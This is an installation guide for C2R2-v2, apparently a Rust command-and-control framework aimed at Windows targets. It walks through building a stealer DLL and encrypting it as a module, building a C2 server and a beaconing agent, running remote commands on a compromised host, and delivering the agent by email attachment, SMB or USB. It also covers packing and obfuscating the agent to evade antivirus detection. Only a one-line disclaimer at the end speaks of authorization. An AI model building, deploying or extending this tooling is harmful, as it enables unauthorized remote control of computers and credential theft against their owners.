# Installation Guide

This guide covers building and installing C2R2-v2 from source.

## Prerequisites

### System Requirements

**Operating Systems**:
- **Build Machine**: Linux (Ubuntu/Debian/Kali), WSL2, or macOS
- **Target Systems**: Windows 10/11 (x64)

**Hardware Requirements**:
- **CPU**: x86_64 architecture
- **RAM**: 2GB minimum (4GB recommended)
- **Disk**: 1GB free space

### Required Software

#### 1. Rust Toolchain

Install Rust using rustup:

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env
```

Verify installation:

```bash
rustc --version  # Should be 1.70.0 or newer
cargo --version
```

#### 2. MinGW-w64 (for cross-compilation)

**On Ubuntu/Debian/Kali**:
```bash
sudo apt update
sudo apt install mingw-w64 -y
```

**On Arch Linux**:
```bash
sudo pacman -S mingw-w64-gcc
```

**On macOS**:
```bash
brew install mingw-w64
```

#### 3. Windows Target for Rust

Add the Windows target to your Rust toolchain:

```bash
rustup target add x86_64-pc-windows-gnu
```

Verify installation:

```bash
rustup target list | grep windows
# Should show: x86_64-pc-windows-gnu (installed)
```

## Building from Source

### Clone the Repository

```bash
git clone https://github.com/G4sp4rCS/C2R2-v2.git
cd C2R2-v2
```

### Build Components

C2R2-v2 consists of multiple components that must be built in order:

#### Step 1: Build the Stealer Module

The stealer module is a Windows DLL that must be compiled first.

**Option A: Using the build script (recommended)**:

```bash
./build-stealer.sh
```

**Option B: Manual build**:

```bash
cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll
```

This generates: `target/x86_64-pc-windows-gnu/release/stealer.dll`

**Verify the build**:

```bash
ls -lh target/x86_64-pc-windows-gnu/release/stealer.dll
# Should show ~2MB DLL file
```

#### Step 2: Encrypt the Stealer Module

The builder tool encrypts the stealer module for secure deployment:

```bash
cd builder
cargo run --release -- encrypt-module
```

This generates:
- `c2r2-server/modules/stealer.enc` - Encrypted module
- `c2r2-server/modules/stealer.key` - Encryption key

**Verify encryption**:

```bash
ls -lh ../c2r2-server/modules/
# Should show stealer.enc and stealer.key
```

#### Step 3: Build the C2 Server

Build the server component that runs on your attack machine:

```bash
cd ../c2r2-server
cargo build --release
```

This generates: `target/release/c2r2-server`

**Verify the server binary**:

```bash
./target/release/c2r2-server --help
# Should display help message
```

#### Step 4: Build the Agent

Use the builder tool to create a configured agent:

```bash
cd ../builder
cargo run --release -- build-agent \
    --name agent1 \
    --server 192.168.1.10:4444
```

**Parameters**:
- `--name`: Agent identifier (used for output filename)
- `--server`: C2 server address and port

This generates: `builder/output/agent1.exe` (~60KB)

**Verify the agent**:

```bash
ls -lh output/agent1.exe
file output/agent1.exe
# Should show PE32+ executable for Windows
```

### Alternative: Build All Components

To build all components at once (except Windows-specific agent):

```bash
# From project root
cargo build --release -p c2r2-server -p builder
```

## Configuration

### Server Configuration

Create a configuration file (optional):

```bash
cd c2r2-server
cat > config.toml << EOF
[server]
listen_addr = "0.0.0.0"
listen_port = 4444

[logging]
level = "info"
log_dir = "logs"
log_file = "c2r2.log"

[modules]
modules_dir = "modules"
EOF
```

### Agent Configuration

Agent configuration is embedded at build time. To change settings:

1. **Edit agent configuration**:

```bash
# Edit agent/src/config.rs
nano agent/src/config.rs
```

```rust
// Change C2 server address
pub const C2_SERVER: &str = "your.server.ip:4444";
```

2. **Rebuild agent**:

```bash
cd builder
cargo run --release -- build-agent --name custom-agent --server new.server.ip:4444
```

### Beacon Configuration

Default beacon settings:

- **Interval**: 60 seconds
- **Jitter**: ±30%
- **Retry Backoff**: Exponential (max 300s)

To change defaults, edit `agent/src/beacon.rs`:

```rust
impl Default for BeaconConfig {
    fn default() -> Self {
        Self {
            interval: 60,        // seconds
            jitter_percent: 30,  // ±30%
        }
    }
}
```

## Deployment

### Server Deployment

1. **Transfer server binary to attack machine**:

```bash
scp target/release/c2r2-server user@attack-machine:/opt/c2r2/
```

2. **Transfer encrypted modules**:

```bash
scp -r c2r2-server/modules user@attack-machine:/opt/c2r2/
```

3. **Start the server**:

```bash
ssh user@attack-machine
cd /opt/c2r2
./c2r2-server
```

### Agent Deployment

1. **Transfer agent to target** (use your preferred method):

```bash
# Example methods:
# - SMB share
# - HTTP download
# - USB drive
# - Email attachment (in test environments only!)
```

2. **Execute agent on target**:

```cmd
# From Windows target
agent1.exe
```

The agent will automatically connect to the configured C2 server.

## Verification

### Test Server Connection

1. **Start the server**:

```bash
cd c2r2-server
./target/release/c2r2-server
```

Expected output:
```
[INFO] C2R2 Server v2.0.0
[INFO] Listening on 0.0.0.0:4444
[INFO] Modules loaded: stealer.enc
[INFO] Ready for connections
```

2. **Test from another terminal**:

```bash
# Test connectivity
nc -zv localhost 4444
# Should show: Connection to localhost 4444 port [tcp/*] succeeded!
```

### Test Agent Connection

1. **Run agent in test environment**:

```bash
# If running in Wine (for testing):
wine output/agent1.exe

# Or deploy to actual Windows VM/machine
```

2. **Verify connection in server**:

```
C2R2> /list
╔════╤══════════╤══════════╤════════════╤════════════╤═══════════════════════╗
║ ID │ Hostname │ Username │ OS         │ Privileges │ Connected             ║
╠════╪══════════╪══════════╪════════════╪════════════╪═══════════════════════╣
║ 1  │ WIN10-VM │ user     │ Windows 10 │ User       │ 2024-01-15 10:30:45  ║
╚════╧══════════╧══════════╧════════════╧════════════╧═══════════════════════╝
```

### Test Commands

```bash
C2R2> /select 1
[*] Selected client 1

C2R2> /cmd whoami
[+] WIN10-VM\user

C2R2> /cmd dir C:\
[+] Directory listing...
```

## Troubleshooting

### Build Errors

**Error: "linker 'x86_64-w64-mingw32-gcc' not found"**

Solution:
```bash
# Install MinGW
sudo apt install mingw-w64

# Verify installation
which x86_64-w64-mingw32-gcc
```

**Error: "target 'x86_64-pc-windows-gnu' not found"**

Solution:
```bash
rustup target add x86_64-pc-windows-gnu
```

**Error: "failed to run custom build command for winapi"**

Solution:
```bash
# Update Rust
rustup update

# Clean and rebuild
cargo clean
cargo build --release
```

### Connection Issues

**Agent won't connect**

1. Check server is running:
```bash
netstat -tlnp | grep 4444
```

2. Check firewall:
```bash
# Allow incoming on port 4444
sudo ufw allow 4444/tcp
```

3. Verify agent configuration:
```bash
# Agent should point to correct server IP
strings output/agent1.exe | grep -E '\d+\.\d+\.\d+\.\d+'
```

**Agent connects then disconnects**

1. Check server logs:
```bash
tail -f c2r2-server/logs/app.log
```

2. Verify beacon timing:
```bash
# Agent waits before reconnecting (60s ±30% by default)
# This is normal beacon behavior
```

### Module Loading Issues

**Error: "Failed to load module stealer.enc"**

Solution:
```bash
# Verify module files exist
ls -l c2r2-server/modules/

# Rebuild and encrypt module
./build-stealer.sh
cd builder
cargo run --release -- encrypt-module
```

**Error: "Decryption failed"**

Solution:
```bash
# Ensure stealer.key matches stealer.enc
# Rebuild both if necessary
cd builder
cargo run --release -- encrypt-module
```

### Permission Issues

**Error: "Permission denied" when running server**

Solution:
```bash
# Make binary executable
chmod +x target/release/c2r2-server

# Or run with sudo if binding to port < 1024
sudo ./target/release/c2r2-server
```

## Advanced Configuration

### Custom Port Configuration

Edit `agent/src/config.rs` and rebuild:

```rust
pub const C2_SERVER: &str = "192.168.1.10:8443"; // Custom port
```

### SSL/TLS (Planned)

Currently C2R2-v2 uses raw TCP. HTTPS support is planned for future releases.

Workaround: Use SSH port forwarding:

```bash
# On target (if SSH available)
ssh -R 4444:localhost:4444 user@attack-machine

# Agent connects to localhost:4444
# Traffic tunneled through SSH
```

### Multiple Servers (Redundancy)

Edit agent to try multiple servers:

```rust
const C2_SERVERS: &[&str] = &[
    "primary.server.com:4444",
    "backup.server.com:4444",
    "192.168.1.10:4444",
];
```

Implementation of multi-server support is planned for future releases.

## Building for Production

### Optimization Tips

1. **Enable maximum optimization**:

```toml
# In Cargo.toml
[profile.release]
opt-level = "z"        # Optimize for size
lto = true             # Link-time optimization
codegen-units = 1      # Single codegen unit
strip = true           # Strip symbols
panic = "abort"        # No unwinding
```

2. **Compress binary with UPX** (use with caution - may trigger AV):

```bash
# Install UPX
sudo apt install upx

# Compress agent
upx --best --lzma output/agent1.exe
```

3. **Additional obfuscation**:

```bash
# Use tools like:
# - LLVM obfuscator
# - PE packers/crypters
# - Code virtualizers
```

### Security Hardening

1. **Change default port**:
```rust
// agent/src/config.rs
pub const C2_SERVER: &str = "server.com:443";  // Use HTTPS port
```

2. **Enable all string obfuscation**:
```rust
// Add obfstr! to all sensitive strings
let cmd = obfstr!("whoami");
```

3. **Implement certificate pinning** (when HTTPS support added):
```rust
// Pin server certificate
const SERVER_CERT_HASH: &str = "sha256:...";
```

## Uninstallation

### Remove Build Artifacts

```bash
# From project root
cargo clean

# Remove outputs
rm -rf builder/output/
rm -rf c2r2-server/modules/*.enc
rm -rf c2r2-server/logs/
```

### Remove Installed Toolchains

```bash
# Remove Windows target
rustup target remove x86_64-pc-windows-gnu

# Completely remove Rust (optional)
rustup self uninstall
```

### Clean Target Systems

To remove agent from target systems:

```cmd
# From Windows target
taskkill /F /IM agent1.exe

# Remove persistence (if established)
# Use the /persist_remove command from C2 server first
```

## Next Steps

After successful installation:

1. Read the [Usage Guide](USAGE.md) for command reference
2. Review [Security Considerations](SECURITY.md) for OPSEC tips
3. Explore [Modules Documentation](MODULES.md) for capability details
4. See [Development Guide](DEVELOPMENT.md) to extend functionality

## Getting Help

If you encounter issues:

1. Check this guide's Troubleshooting section
2. Review logs in `c2r2-server/logs/`
3. Open an issue on GitHub with:
   - System information
   - Build output
   - Error messages
   - Steps to reproduce

---

**Note**: Always ensure you have proper authorization before deploying C2R2-v2 on any systems. Unauthorized access to computer systems is illegal.
